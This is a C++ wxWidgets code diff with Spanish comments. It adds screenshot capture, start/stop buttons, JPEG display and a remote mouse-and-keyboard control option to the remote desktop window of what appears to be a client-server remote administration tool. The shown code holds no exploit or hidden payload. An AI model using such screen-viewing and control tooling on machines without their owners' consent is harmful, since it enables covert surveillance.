@@ -8,14 +8,16 @@ extern std::mutex vector_mutex;
 
 wxBEGIN_EVENT_TABLE(frameRemoteDesktop, wxFrame)
 	EVT_CLOSE(frameRemoteDesktop::Onclose)
+	EVT_BUTTON(EnumRemoteDesktop::ID_BTN_Single, frameRemoteDesktop::OnSingle)
 wxEND_EVENT_TABLE()
 
 frameRemoteDesktop::frameRemoteDesktop(wxWindow* pParent) :
-	wxFrame(pParent, wxID_ANY, "Escritorio Remoto", wxDefaultPosition, wxDefaultSize, wxDD_DEFAULT_STYLE) {
+	wxFrame(pParent, EnumRemoteDesktop::ID_Main_Frame, "Escritorio Remoto", wxDefaultPosition, wxDefaultSize) {
 	//Crear controles en la parte superior
 	//  [Iniciar] [Detener]  [Guardar Captura]  [] CheckBox para controlar mouse y teclado
 	//  Resolution Fastest | Low | Medium | High
-	//Crear picture box
+	wxImage::AddHandler(new wxJPEGHandler);
+
 	wxWindow* wxTree = (MyTreeCtrl*)this->GetParent();
 	if (wxTree) {
 		wxPanel* panel_cliente = (wxPanel*)wxTree->GetParent();
@@ -26,11 +28,60 @@ frameRemoteDesktop::frameRemoteDesktop(wxWindow* pParent) :
 			}
 		}
 	}
+	
+	// - - - - - - - - - CONTROLES PRINCIPALES  - - - - - - - - - 
+	wxButton* btn_Single = new wxButton(this, EnumRemoteDesktop::ID_BTN_Single, "Tomar Captura");
+	wxButton* btn_Iniciar = new wxButton(this, EnumRemoteDesktop::ID_BTN_Start, "Iniciar");
+	wxButton* btn_Detener = new wxButton(this, EnumRemoteDesktop::ID_BTN_Stop, "Detener");
+	wxButton* btn_Guardar = new wxButton(this, EnumRemoteDesktop::ID_BTN_Save, "Guardar Captura");
+	wxCheckBox* chk_Control = new wxCheckBox(this, EnumRemoteDesktop::ID_CHK_Control, "Control Remoto (mouse y teclado)");
+	btn_Detener->Enable(false);
+	
+	wxBoxSizer* sizer_controles = new wxBoxSizer(wxHORIZONTAL);
+
+	sizer_controles->Add(btn_Single);
+	sizer_controles->Add(btn_Iniciar);
+	sizer_controles->Add(btn_Detener);
+	sizer_controles->Add(btn_Guardar);
+	sizer_controles->Add(chk_Control);
+	// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+	this->imageCtrl = new wxStaticBitmap(this, EnumRemoteDesktop::ID_Bitmap, wxBitmap(10,10));
+	this->imageCtrl->SetScaleMode(wxStaticBitmap::ScaleMode::Scale_AspectFit);
+
+	wxBoxSizer* main_sizer = new wxBoxSizer(wxVERTICAL);
+
+	main_sizer->Add(sizer_controles, 0, wxEXPAND | wxALL, 2);
+	main_sizer->Add(this->imageCtrl, 1, wxEXPAND | wxALL, 2);
+
+	this->SetSizer(main_sizer);
+	this->Layout();
+	
+}
+
+void frameRemoteDesktop::OnSingle(wxCommandEvent&) {
 	std::string strComando = std::to_string(EnumComandos::RD_Single);
 	strComando.append(1, CMD_DEL);
-	strComando += "24"; //quality
-
+	strComando += "32"; //quality
 	p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
+}
+
+void frameRemoteDesktop::OnDrawBuffer(const char* cBuffer, int iBuffersize) {
+	if (iBuffersize > 0) {
+		wxMemoryInputStream imgStream(cBuffer, iBuffersize);
+		wxImage img(imgStream, wxBITMAP_TYPE_JPEG);
+		
+		img.Rescale(this->GetSize().x, this->GetSize().y-20);
+		if (img.IsOk()) {
+			wxBitmap bmp_Obj(img);
+			
+			if (this->imageCtrl) {
+				this->imageCtrl->SetBitmap(bmp_Obj);
+				this->Refresh();
+				this->Update();
+			}
+		}
+	}
 }
 
 void frameRemoteDesktop::Onclose(wxCloseEvent&) {
